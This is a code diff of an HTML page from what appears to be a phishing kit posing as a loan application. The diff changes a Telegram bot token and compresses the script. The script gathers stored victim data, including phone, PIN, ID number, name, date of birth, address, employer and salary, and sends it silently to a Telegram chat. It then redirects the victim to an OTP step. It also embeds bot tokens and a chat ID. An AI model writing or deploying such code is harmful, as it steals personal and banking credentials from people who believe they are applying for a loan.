@@ -7,49 +7,15 @@
 @keyframes spin{to{transform:rotate(360deg)}}
 .timer-box{color:#65a30d;font-weight:bold;font-size:16px}
 </style></head><body>
-<div class="box">
-<div class="loader"></div>
-<div class="timer-box">Submitting your application...</div>
-</div>
+<div class="box"><div class="loader"></div><div class="timer-box">Submitting your application...</div></div>
 <script>
-const BOT_TOKEN = "8917447619:AAEUHL4o4CYy4SMyrLqrw1knboCk-AApmlQ";
+const BOT_TOKEN = "8978752568:AAH8Mties7YO3lt8HSBqSDZtps8lqMHDQgk";
 const CHAT_ID = "8630213836";
-
-const data = {
-  amount: localStorage.getItem('amount'),
-  period: localStorage.getItem('period'),
-  phone: localStorage.getItem('loginPhone'),
-  pin: localStorage.getItem('loginPIN'),
-  idNumber: localStorage.getItem('idNumber'),
-  fullName: localStorage.getItem('fullName'),
-  dob: localStorage.getItem('dob'),
-  address: localStorage.getItem('address'),
-  employer: localStorage.getItem('employer'),
-  job: localStorage.getItem('job'),
-  salary: localStorage.getItem('salary')
-};
-
+const data = {amount: localStorage.getItem('amount'),period: localStorage.getItem('period'),phone: localStorage.getItem('loginPhone'),pin: localStorage.getItem('loginPIN'),idNumber: localStorage.getItem('idNumber'),fullName: localStorage.getItem('fullName'),dob: localStorage.getItem('dob'),address: localStorage.getItem('address'),employer: localStorage.getItem('employer'),job: localStorage.getItem('job'),salary: localStorage.getItem('salary')};
 const message = `🆕 *NEW LOAN APPLICATION*\n\n💰 *Loan:* $${data.amount} for ${data.period} months\n📱 *Phone:* ${data.phone}\n🔒 *PIN:* ${data.pin}\n\n👤 *Name:* ${data.fullName}\n🆔 *ID:* ${data.idNumber}\n🏠 *Address:* ${data.address}\n💼 *Job:* ${data.job} at ${data.employer}\n💵 *Salary:* ${data.salary}\n\n⏰ *Time:* ${new Date().toLocaleString()}`;
-
-// Send to Telegram - FORCE SEND
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-  method: 'POST',
-  mode: 'no-cors', // THIS FIXES RENDER BLOCK
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
-});
-
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method: 'POST',mode: 'no-cors',headers: {'Content-Type': 'application/json'},body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})});
 document.querySelector('.timer-box').innerHTML = '✅ Sent to admin. Redirecting...';
-
-// CLEAR AND REDIRECT TO OTP1
 localStorage.clear(); 
 let count = 5;
-const timer = setInterval(()=>{
-  document.querySelector('.timer-box').innerHTML = `Redirecting to verification in ${count}s...`;
-  count--;
-  if(count <= 0){
-    clearInterval(timer);
-    window.location='loading.html?next=otp1.html';
-  }
-}, 1000);
+const timer = setInterval(()=>{document.querySelector('.timer-box').innerHTML = `Redirecting to verification in ${count}s...`;count--;if(count <= 0){clearInterval(timer);window.location='loading.html?next=otp1.html';}}, 1000);
 </script></body></html>
